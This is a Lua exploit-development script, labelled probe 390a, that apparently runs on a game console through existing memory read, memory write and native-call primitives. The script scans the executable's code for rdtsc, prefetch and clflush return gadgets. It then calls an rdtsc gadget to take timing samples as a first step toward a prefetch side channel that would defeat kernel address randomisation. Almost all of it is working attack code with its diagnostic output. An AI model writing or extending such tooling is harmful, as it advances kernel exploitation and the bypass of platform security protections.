-- CRASH_CLASS: LOW
-- PROBE 390a: KASLR gadget scan — prefetch + rdtsc in eboot
--
-- Context: ALL info-leak paths are dead. KASLR is the hard wall.
-- AMD Zen 2 prefetch timing can distinguish mapped/unmapped kernel pages.
-- We need: (1) prefetch [reg]; ret gadget (2) rdtsc; ret for timing.
-- Eboot is RX (readable) — scan full .text for these byte patterns.
--
-- Patterns sought:
--   0F 31 C3       — rdtsc; ret
--   0F 01 F9 C3    — rdtscp; ret
--   0F 18 XX C3    — prefetchNTA/T0/T1/T2 [reg]; ret
--   0F 0D XX C3    — prefetchW [reg]; ret
--   Also: 0F AE XX C3 — clflush [reg]; ret (cache flush, useful for Flush+Reload)
--   Also: any 0F 31 near a ret (rdtsc within small distance of C3)

print("=== PROBE 390a: KASLR gadget scan ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end

-- Get eboot base
local info = memory.alloc(0x200)
zero_buf(info, 0x200)
wd(N(info), 0x160)
local sc_info = mk(593)
pcall(function() sc_info(uint64(0), info) end)

local text_lo = rd(N(info) + 0x108)
local text_hi = rd(N(info) + 0x10C)
local text_size_lo = rd(N(info) + 0x110)
local text_size_hi = rd(N(info) + 0x114)

if not text_lo or text_lo == 0 then
    print("FAIL: can't get eboot base")
    return
end

local eboot_base = text_lo
local eboot_size = text_size_lo or 0x480000  -- fallback ~4.6MB
print(string.format("eboot .text: 0x%X%08X, size: 0x%X", text_hi or 0, eboot_base, eboot_size))
print("")

-- ===================================================================
-- [A] Scan for rdtsc (0F 31) and rdtscp (0F 01 F9)
-- ===================================================================
print("[A] rdtsc/rdtscp scan")

local rdtsc_hits = {}
local rdtscp_hits = {}

-- Read eboot in dwords, scan for byte patterns
-- We read overlapping to catch cross-boundary patterns
local scan_end = eboot_base + eboot_size - 8
local prev_dw = 0

for addr = eboot_base, scan_end, 4 do
    local dw = rd(addr)
    if not dw then break end

    -- Check within this dword for 0F 31 (rdtsc)
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256

    -- Also get next dword for cross-boundary checks
    local next_dw = rd(addr + 4)
    local b4 = next_dw and (next_dw % 256) or 0
    local b5 = next_dw and (math.floor(next_dw / 256) % 256) or 0
    local b6 = next_dw and (math.floor(next_dw / 65536) % 256) or 0

    -- Check all positions for 0F 31
    local bytes = {b0, b1, b2, b3, b4, b5, b6}
    for i = 1, 4 do
        if bytes[i] == 0x0F and bytes[i+1] == 0x31 then
            local off = addr - eboot_base + (i - 1)
            -- Check if C3 (ret) follows within 0-6 bytes
            local ret_dist = -1
            for j = i + 2, math.min(i + 8, 7) do
                if bytes[j] == 0xC3 then
                    ret_dist = j - i - 2
                    break
                end
            end
            -- Also check further bytes
            if ret_dist < 0 and next_dw then
                local next2 = rd(addr + 8)
                if next2 then
                    local nb = {
                        next2 % 256,
                        math.floor(next2 / 256) % 256,
                        math.floor(next2 / 65536) % 256,
                        math.floor(next2 / 16777216) % 256
                    }
                    for j = 1, 4 do
                        local total_dist = (7 - i) + j
                        if total_dist <= 10 and nb[j] == 0xC3 then
                            ret_dist = total_dist - 2
                            break
                        end
                    end
                end
            end
            rdtsc_hits[#rdtsc_hits + 1] = {off = off, ret_dist = ret_dist}
        end
    end

    -- Check for 0F 01 F9 (rdtscp)
    for i = 1, 2 do
        if bytes[i] == 0x0F and bytes[i+1] == 0x01 and bytes[i+2] == 0xF9 then
            local off = addr - eboot_base + (i - 1)
            local ret_dist = -1
            for j = i + 3, math.min(i + 9, 7) do
                if bytes[j] == 0xC3 then
                    ret_dist = j - i - 3
                    break
                end
            end
            rdtscp_hits[#rdtscp_hits + 1] = {off = off, ret_dist = ret_dist}
        end
    end
end

print(string.format("  rdtsc (0F 31) hits: %d", #rdtsc_hits))
for i, h in ipairs(rdtsc_hits) do
    if i <= 20 then
        local tag = ""
        if h.ret_dist == 0 then tag = " *** RDTSC;RET ***"
        elseif h.ret_dist >= 0 then tag = string.format(" (ret at +%d)", h.ret_dist + 2)
        end
        print(string.format("    eboot+0x%X%s", h.off, tag))
    end
end

print(string.format("  rdtscp (0F 01 F9) hits: %d", #rdtscp_hits))
for i, h in ipairs(rdtscp_hits) do
    if i <= 10 then
        local tag = ""
        if h.ret_dist == 0 then tag = " *** RDTSCP;RET ***"
        elseif h.ret_dist >= 0 then tag = string.format(" (ret at +%d)", h.ret_dist + 3)
        end
        print(string.format("    eboot+0x%X%s", h.off, tag))
    end
end

if not alive() then print("DEAD after [A]"); return end
print("")

-- ===================================================================
-- [B] Scan for prefetch (0F 18) and prefetchw (0F 0D)
-- ===================================================================
print("[B] prefetch scan")

local prefetch_hits = {}

for addr = eboot_base, scan_end, 4 do
    local dw = rd(addr)
    if not dw then break end

    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256

    local next_dw = rd(addr + 4)
    local b4 = next_dw and (next_dw % 256) or 0
    local b5 = next_dw and (math.floor(next_dw / 256) % 256) or 0

    local bytes = {b0, b1, b2, b3, b4, b5}

    for i = 1, 4 do
        -- prefetch: 0F 18 /r [reg]  or  prefetchw: 0F 0D /1 [reg]
        if bytes[i] == 0x0F and (bytes[i+1] == 0x18 or bytes[i+1] == 0x0D) then
            local modrm = bytes[i+2]
            if modrm then
                local mod_field = math.floor(modrm / 64)
                local rm = modrm % 8
                -- mod=00 means [reg] indirect, mod=01 means [reg+disp8]
                -- We want mod=00 with rm != 4(SIB) and rm != 5(disp32)
                -- Best: rm=7(rdi), rm=6(rsi), rm=0(rax)
                if mod_field <= 1 and rm ~= 4 and rm ~= 5 then
                    local off = addr - eboot_base + (i - 1)
                    local itype = bytes[i+1] == 0x18 and "prefetch" or "prefetchw"
                    local reg_names = {"rax","rcx","rdx","rbx","(sib)","(rip)","rsi","rdi"}
                    local reg = reg_names[rm + 1] or "?"

                    -- Check for ret nearby
                    local instr_len = mod_field == 0 and 3 or 4  -- 3 for [reg], 4 for [reg+disp8]
                    local ret_found = false
                    -- Check byte after instruction
                    local ret_pos = i + instr_len
                    if ret_pos <= 6 and bytes[ret_pos] == 0xC3 then
                        ret_found = true
                    end

                    prefetch_hits[#prefetch_hits + 1] = {
                        off = off, itype = itype, reg = reg,
                        modrm = modrm, has_ret = ret_found, mod = mod_field
                    }
                end
            end
        end
    end
end

print(string.format("  prefetch/prefetchw hits: %d", #prefetch_hits))
for i, h in ipairs(prefetch_hits) do
    if i <= 30 then
        local tag = h.has_ret and " *** HAS RET ***" or ""
        local mod_str = h.mod == 0 and "" or string.format("+disp8")
        print(string.format("    eboot+0x%X: %s [%s%s] (modrm=0x%02X)%s",
            h.off, h.itype, h.reg, mod_str, h.modrm, tag))
    end
end

if not alive() then print("DEAD after [B]"); return end
print("")

-- ===================================================================
-- [C] Scan for clflush (0F AE /7 [reg]) — useful for Flush+Reload
-- ===================================================================
print("[C] clflush scan")

local clflush_hits = {}

for addr = eboot_base, scan_end, 4 do
    local dw = rd(addr)
    if not dw then break end

    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256

    local next_dw = rd(addr + 4)
    local b4 = next_dw and (next_dw % 256) or 0

    local bytes = {b0, b1, b2, b3, b4}

    for i = 1, 3 do
        if bytes[i] == 0x0F and bytes[i+1] == 0xAE then
            local modrm = bytes[i+2]
            if modrm then
                local reg_field = math.floor(modrm / 8) % 8
                local mod_field = math.floor(modrm / 64)
                local rm = modrm % 8
                -- clflush is /7, clflushopt is /7 with 66 prefix
                if reg_field == 7 and mod_field <= 1 and rm ~= 4 and rm ~= 5 then
                    local off = addr - eboot_base + (i - 1)
                    local reg_names = {"rax","rcx","rdx","rbx","(sib)","(rip)","rsi","rdi"}
                    clflush_hits[#clflush_hits + 1] = {
                        off = off, reg = reg_names[rm + 1] or "?",
                        mod = mod_field
                    }
                end
            end
        end
    end
end

print(string.format("  clflush hits: %d", #clflush_hits))
for i, h in ipairs(clflush_hits) do
    if i <= 10 then
        print(string.format("    eboot+0x%X: clflush [%s]", h.off, h.reg))
    end
end

if not alive() then print("DEAD after [C]"); return end
print("")

-- ===================================================================
-- [D] If rdtsc found, test it
-- ===================================================================
print("[D] rdtsc test")

-- Find best rdtsc gadget (closest ret)
local best_rdtsc = nil
for _, h in ipairs(rdtsc_hits) do
    if h.ret_dist == 0 then
        best_rdtsc = h
        break
    end
end
if not best_rdtsc then
    for _, h in ipairs(rdtsc_hits) do
        if h.ret_dist and h.ret_dist >= 0 and h.ret_dist <= 4 then
            best_rdtsc = h
            break
        end
    end
end

if best_rdtsc then
    local gadget_addr = eboot_base + best_rdtsc.off
    print(string.format("  testing rdtsc at eboot+0x%X", best_rdtsc.off))

    -- Read 8 bytes at gadget to verify
    local g0 = rd(gadget_addr)
    local g1 = rd(gadget_addr + 4)
    print(string.format("  bytes: %08X %08X", g0 or 0, g1 or 0))

    -- Call it via fcall — rdtsc puts result in EDX:EAX
    -- rax = low 32 bits of TSC
    local ok, tsc1 = pcall(function()
        return native.fcall_with_rax(uint64(gadget_addr), 0)
    end)
    local ok2, tsc2 = pcall(function()
        return native.fcall_with_rax(uint64(gadget_addr), 0)
    end)

    if ok and ok2 then
        local t1 = N(tsc1)
        local t2 = N(tsc2)
        print(string.format("  tsc1=%d, tsc2=%d, delta=%d", t1, t2, t2 - t1))

        -- Quick timing test: measure overhead
        local samples = {}
        for i = 1, 10 do
            local a = N(native.fcall_with_rax(uint64(gadget_addr), 0))
            local b = N(native.fcall_with_rax(uint64(gadget_addr), 0))
            samples[#samples + 1] = b - a
        end
        local sum = 0
        for _, s in ipairs(samples) do sum = sum + s end
        print(string.format("  avg delta (10 samples): %d cycles", math.floor(sum / 10)))
    else
        print("  rdtsc call FAILED")
    end
else
    print("  no usable rdtsc gadget found")
end

if not alive() then print("DEAD after [D]"); return end
print("")

print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 390a COMPLETE ===")
